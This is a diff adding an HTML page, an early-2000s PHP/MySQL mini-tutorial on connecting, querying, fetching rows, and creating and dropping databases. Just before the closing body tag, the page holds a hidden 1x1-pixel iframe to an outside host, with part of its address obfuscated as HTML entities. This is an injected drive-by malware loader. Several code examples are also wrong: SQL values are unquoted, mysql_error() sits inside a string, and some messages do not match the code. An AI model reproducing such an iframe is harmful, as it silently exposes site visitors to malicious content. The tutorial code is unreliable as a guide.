@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>Using Databases In PHP </title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2001 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+	
+		table.example {width: 200px; font-size: 12px; text-align:left}
+		tr.exampletop {background-color: #EBEBEB}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px, 3px, 3px, 3px; text-align: left; width: 550px; margin-left: auto; margin-right: auto}
+	
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+	
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+
+		span.function {color: gray; font-weight: bold}
+		span.term {color: gray; font-style: italic}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px; text-align: left; width: 500px; margin-left: auto; margin-right: auto}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>Using Databases In PHP (ver. 1.0.0)</strong>
+		<br />
+		by: <a href="mailto:spiderman@witty.com">SpiderMan</A> of <a href="http://blacksun.box.sk">Black Sun Research Facility </a>
+	</h1>
+	<h2>Introduction:</h2>
+	<p class="para">
+		This isn't quite a full blown tutorial, I like to think of it as a mini-tutorial. This &#8220;mini-tutorial&#8221; will cover some of the most commonly used functions. There won't be a background section; we're going to go straight to work. Today, I'm going to discuss (if the title didn't give it away) connecting to and using a database with php. The database will be MySQL because it's just sooo darn popular.
+	</p>
+	<h2>Down To Work:</h2>
+	<p class="para">
+		The first thing we need to do is connect to the database.
+	</p>
+	<div class="center">
+		<pre class="example">
+mysql_connect("somehost", "username", "password") or die ("Can't connect!");
+</pre>
+	</div>
+	<p>
+		This will try to connect to the database on somehost and login with &#8220;username&#8221; as the username and &#8220;password&#8221; as the password. If it can't, it will output an error message saying that it can't connect. For your own code be sure to change somehost to your host (most of the times it's localhost, ask your admin), username to your username (duh), and password to your password. Another way to connect to a database is to open a persistent connection. To do this, use the <span class="function">mysql_pconnect</span> function and pass it the same arguments as <span class="function">mysql_connect</span>. Why open a persistent connection? When you call <span class="function">mysql_pconnect</span>, instead of going out and opening a connection to the database, it sees if one is already open, if it is, the script will use it. Also, when the script has finished executing, the connection to the database will not automatically be closed like it is when using <span class="function">mysql_connect</span>. This way the connection can be used later on. Using a persistent connection is a good idea if your scripts constantly need to connect to the database.
+	</p>
+	<p class="para">
+		After we have opened a connection to the database, we then select a database.
+	</p>
+	<div class="center">
+		<pre class="example">
+mysql_select_db("database_name") or die("Can't select database!");
+</pre>
+	</div>
+	<p>
+		This will try to select the database named &#8220;database_name&#8221; (for your own code change it to the name of your database). If it can't select the database, it will output and error. Once you're actually connected to a database, you will want to query a table in the database to get whatever you want done. A query looks like this:
+	</p>
+	<div class="center">
+		<pre class="example">
+mysql_query("Some query");
+</pre>
+	</div>
+	<p class="para">
+		Common queries are <span class="term">SELECT</span> and <span class="term">INSERT</span> For full documentation go to the mysql web site (<a href="http://www.mysql.com" title="Click to visit the MySQL website (link opens in a new browser window)." target="_blank">http://www.mysql.com</a>). Another common php function is <span class="function">mysql_num_rows</span>; if it isn't obvious this gets the number of rows from a query. Here is an example of how it can be used with <span class="function">mysql_query</span>:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php
+  $result= mysql_query("SELECT * FROM some_table");
+  $number_of_rows= @mysql_num_rows($result);
+      
+  if ($number_of_rows == 0)
+  {
+    echo "Sorry there are no rows";
+  }
+  else {
+    echo "Yes! we found some rows!";
+  } 
+?&gt;
+</pre>
+	</div>
+	<p>
+		Now you may be wondering why I put the @ sign before <span class="function">mysql_num_rows</span>. In php, the @ sign suppress errors; I put it in front of <span class="function">mysql_num_rows</span> so that if there are no rows, MySQL will not output a bunch of errors. So when would <span class="function">mysql_num_rows</span> be useful? Well, you could use it for an authentication script which searchs the database for a username and password and if it doesn't find any (i.e. if no rows are returned), it tells the user that the username, or password, are not correct.
+	</p>
+	<p class="para">
+		Another really useful function is <span class="function">mysql_fetch_array</span>, because it gets the rows and puts them in an array that contains the name of the rows. That way instead of having to access each row by number you can do it by name! For example, let's say that our database looked like this:
+	</p>
+	<div class="center">
+		<table class="example" align="center" border="1" cellspacing="0" cellpadding="2" summary="Table of flags">
+			<tr class="exampletop">
+				<td>User</td>
+				<td>Password</td>
+			</tr>
+			<tr class="example">
+				<td>John</td>
+				<td>afasdfadsfdsf</td>
+			</tr>
+			<tr class="example">
+				<td>Billy</td>
+				<td>tla;jrjealjwqsldajf</td>
+			</tr>
+			<tr class="example">
+				<td>Mitch</td>
+				<td>pqrtupipripewir</td>
+			</tr>
+		</table>
+	</div>
+	<p>
+		We would use the following code to get the users' names and output them:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php
+  echo "The users in this database are: &lt;br&gt;";  
+  $result= mysql_query("SELECT * FROM some_table");
+      
+  while ($row= mysql_fetch_array($result))
+  {
+    $username= $row["User"]; 
+    echo "$username&lt;br&gt;";
+  } 
+?&gt;
+</pre>
+	</div>
+	<p>
+		This will output all the usernames in a database; you can add error checking if you like. The while statement is read &#8220;while there are rows that satisfy the query, put the contents of the row from the column &#8216;User&#8217; into the variable &#8216;username,&#8217; and print the usernames (each on a new line) to an HTML page.&#8221;
+	</p>
+	<p class="para">
+		Now let's cover a couple of functions that actually work with the database. The first is <span class="function">mysql_create_db</span>, don't you just love how the functions are named you can figure out what they do just by looking at the function name, this one obviously creates a database. Here's how to use it:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php 
+  echo "I am going to try to create a database...&lt;br&gt;";
+      
+  if (mysql_create_db("test_database"))
+  {
+    echo "Hooray, I've created the database!&lt;br&gt;";
+  }
+  else { 
+    echo "Darn couldn't create the database! because: ";
+    echo "mysql_error() &lt;br&gt;";
+  }
+?&gt;
+</pre>
+	</div>
+	<p>
+		You can see I used a new function, <span class="function">mysql_error</span>, you don't really need to know too much about it, all it does is return the error string sent by MySQL. Now since we learned how to create a database, how's about we learn to delete one. To do that use the <span class="function">mysql_drop_db</span>, here is how to use it:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php 
+  echo "I am going to try to delete a database...&lt;br&gt;";
+  $result= mysql_drop_db("test_database");
+      
+  if (!$result)
+  {
+    echo "Darn couldn't I couldn't delete the database!&lt;br&gt;";                   
+  }
+  else { 
+    echo "Hooray, I've deleted the database&lt;br&gt;";   
+  }
+?&gt;
+</pre>
+	</div>
+	<p>
+		You can see that the syntax is very similar to that of <span class="function">mysql_create_db</span>, just pop the name of the database you want to delete into the function.
+	</p>
+	<p class="para">
+		The next two items aren't functions, rather they are queries that you can use to manage an existing table. The following query will insert data into a database:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php 
+  echo "I am going to try to insert data into a table...&lt;br&gt;";
+  $result= mysql_query("INSERT INTO test_database (username, password) VALUES 
+	               (Rahim, adfjaldadfsdaf)");
+      
+  if (!$result)
+  {
+    echo "Darn couldn't I couldn't delete the database!&lt;br&gt;"; 
+  }
+  else { 
+    echo "Hooray, I've deleted the database&lt;br&gt;";     
+  }
+?&gt;
+</pre>
+	</div>
+	<p>
+		This query should be pretty obvious, it inserts the data defined in between the parentheses into the rows. Just a little note to remember, the order in which you write out the column names is the order your data will be entered (i.e. a row with the contents Rahim will be entered under username, not password since we wrote username then pasword, if it was reveresd Rahim would be put under password).
+	</p>
+	<p class="para">
+		The next query we've already gone over, I'm just going to add to it; after I'm done you should be able to use it to help create a simple search engine (upcomming tutorial)! For the sake of brevity I'll remove all the extra php stuff and just show you the &#8220;meat&#8221; of the code.
+	</p>
+	<div class="center">
+		<pre class="example">
+$result= mysql_query("SELECT name FROM some_table WHERE name=Joe AND 
+         lastname=Sixpack OR lastname=Becker ORDER BY lastname LIMIT 20");
+</pre>
+	</div>
+	<p>
+		Now I know that looks like a long query, but it's not really all that bad. What it's pretty much saying is: &#8220;Get me the name from some_table where the name is Joe and the lastname is Sixpack or Becker, oh and by the way while your at it, put it in alphabetical order by the lastname; oh and one last thing, just get the first 20 results please.&#8221; MySQL has lots of other filters that you can add on to the SELECT statement, I highly suggest you download the MySQL documentation and give it a perusing.
+	</p>
+	<h2>Conclusion:</h2>
+	<p class="para">
+		Well that wraps up this &#8220;mini-tutorial&#8221;, you should use this as a quick reference for my other (upcomming) tutorials. If you found any errors or have any comments please e-mail me (<a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>), kindly direct questions to the message board.
+	</p>
+	<div class="lastupdate">Last updated: <strong>5/28/01</strong></div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
